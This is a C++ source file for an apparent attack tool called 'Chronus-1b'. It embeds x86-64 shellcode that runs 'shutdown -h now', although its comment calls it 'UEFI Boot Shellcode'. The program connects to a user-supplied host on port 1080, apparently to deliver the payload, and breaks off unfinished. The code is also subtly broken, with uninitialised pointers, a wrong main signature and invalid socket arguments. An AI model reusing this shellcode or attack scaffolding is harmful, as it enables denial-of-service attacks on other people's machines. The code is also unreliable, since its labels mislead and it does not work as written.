#include <unistd.h>
#include <sys/socket.h>
#include <iostream>
#include <netinet/in.h>
#include <stdio.h>

#include "resource/iphdr"

/* UEFI Boot Shellcode. */

#define port 1080

unsigned char code[] =  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
"\x77\x66\x68\x6e\x6f\x48\x89\xe3"
"\x50\x66\x68\x2d\x68\x48\x89\xe1"
"\x50\x49\xb8\x2f\x73\x62\x69\x6e"
"\x2f\x2f\x2f\x49\xba\x73\x68\x75"
"\x74\x64\x6f\x77\x6e\x41\x52\x41"
"\x50\x48\x89\xe7\x52\x53\x51\x57"
"\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
"\x05";


int codelength = sizeof(code);

int main(char ** argv[], int * argc)  
{
    // our socket
    int ipv4 = socket(AF_UNSPEC, SOCK_PACKET, 0);
    
    // address structure
    char * address;
    struct hostent* host;

    int set, conn; // bind and connect placeholders.

    // IP Header configuration.
    h_data token;
    iphdr* header;

    char buffer[8] = {IPPROTO_TCP};

    std::ios::sync_with_stdio(true);

    printf(" Chronus-1b \n");

    printf(" Designed by poet5. \n \n");

    printf(" Enter in Linux Build: \n");

    std::cin >> address;

    printf("Getting host. \n");

    host = gethostbyname(address);

    if (host < 0) 
    {
        herror("gethostbyname");
        exit(-1);
    }
    else 
    {
        printf(" Host found, initializing connection \n");
    }
    // *( struct in_addr*)host->h_addr_list

    sockaddr_in storage;
    storage.sin_addr.s_addr = INADDR_ANY;
    storage.sin_family = AF_INET;
    storage.sin_port = htons(0); // Port 0 is for dynamic port.

    sockaddr_in remote;
    remote.sin_addr = *( struct in_addr*)host->h_addr_list;
    remote.sin_family = AF_INET;
    remote.sin_port = htons(port);

    set = bind(ipv4, (sockaddr*)&storage, sizeof(storage) );

    if (set < 0) 
    {
        herror("bind");
        exit(-1);
    }

    conn = connect(ipv4, (sockaddr*)&remote, sizeof(remote));
    if (conn < 0) 
    {
        herror("connect");
        exit(-1);
    }
    // After initial connection has been made, declare IP Header.

    header->saddr = INADDR_ANY;
    header->daddr = inet_addr(address);
    header->ttl = 5; // 5 seconds live time.
    header->protocol = IPPROTO_TCP;

    token.HtonData(header, buffer);

    // Now its time for a check sum.
}